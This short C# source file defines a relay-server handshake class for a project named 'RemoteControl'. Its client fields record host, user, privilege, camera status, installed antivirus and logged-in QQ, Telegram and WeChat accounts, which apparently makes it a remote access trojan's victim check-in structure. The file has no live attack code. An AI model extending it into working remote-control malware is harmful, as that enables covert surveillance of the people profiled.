using System;

namespace RemoteControl.Protocals.Relay
{
    /// <summary>
    /// 中转服务器握手包 - 连接后第一个包，标识身份
    /// </summary>
    public class RelayHandshake
    {
        /// <summary>
        /// 身份类型: "client" 或 "controller"
        /// </summary>
        public string Role = "";

        /// <summary>
        /// 主机名(客户端填写)
        /// </summary>
        public string HostName = "";

        /// <summary>
        /// 客户端应用路径(客户端填写)
        /// </summary>
        public string AppPath = "";

        /// <summary>
        /// 上线头像(客户端填写)
        /// </summary>
        public string OnlineAvatar = "";

        public string UserName = "";
        public string LocalIP = "";
        public string OSVersion = "";
        public string Privilege = "";
        public string CameraStatus = "";
        public string Antivirus = "";
        public string OnlineQQ = "";
        public string TG = "";
        public string WX = "";
        public string UserStatus = "";
        public string Region = "";
        public string ISP = "";
    }
}
